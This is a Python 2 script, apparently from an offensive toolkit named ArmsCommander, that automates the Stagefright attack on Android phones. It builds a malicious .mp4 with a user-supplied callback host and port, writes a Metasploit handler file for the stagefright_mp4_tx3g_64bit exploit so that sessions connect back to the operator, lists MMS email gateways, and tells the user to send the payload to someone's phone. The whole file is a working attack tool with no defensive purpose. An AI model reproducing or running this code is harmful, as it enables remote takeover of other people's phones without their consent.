import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
import time

# sample command
# python /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/mp4.py -c <callback HOST> -p <callback PORT> -s <OPTIONAL spray address> -r <ROP pivot> -o <OUTPUT file .mp4>
os.system('cat /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/Banner-And-DS-HowTo.txt')

def GENERATE_payload():
    # Generate payload to send
    call_Host = str(raw_input("Enter the IP address of LHOST or Callback Host: "))
    call_Port = str(raw_input("Enter the port for LHOST or Callback Host: "))
    output_File = str(raw_input("Enter the name of the output file(just what you want to call it): "))
    basic_Output_Directory = "/root/ArmsCommander/mobiledevices/DIAMOND_SHARK/payload/"
    named_Output_Directory = basic_Output_Directory + output_File + '.mp4'
    cmd_String = "python /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/mp4.py -c %s -p %s -o %s" % (call_Host, call_Port, named_Output_Directory)
    print colored('Your generated payload is at: ' + named_Output_Directory,'red','on_white')
    os.system(cmd_String)

    # generate handler file
    # for some reason this doesnt work

    # handler_filename = 'root/ArmsCommander/DIAMOND_SHARK/' + output_File + '.rc'
    handler = open('/root/ArmsCommander/mobiledevices/DIAMOND_SHARK/payload/handler_file.rc','w')
    handler.write('use exploit/android/browser/stagefright_mp4_tx3g_64bit')
    handler.write('\nset LHOST 0.0.0.0')
    handler_port = 'set LPORT ' + call_Port
    handler.write('\n' + handler_port)
    handler.write('\nset ExitOnSession false')
    handler.write('\nexploit -j -z')
    handler.close()
    print colored('Your handler file is located at: /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/payload/handler_file.rc','red','on_white')
    print "To use your handler in Metasploit, start it, and then type 'resource <file>.rc'"
    # Tell them to go send it
    print colored('Go send the payload to someone as a email (the phone number email) (:','red','on_white')
    main()
    return

def PRINT_all_MMS_addresses():
    os.system('cat /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/allMMSAddresses.txt')
    main()
    return

def main():
    opt_List = [
        '\n\t#1. Show all possible MMS Addresses To Email Payload to...',
        '#2. Generate the mp4 file payload that you have to send'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        PRINT_all_MMS_addresses()
        main()
    elif opt_Choice == "2":
        GENERATE_payload()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
main()
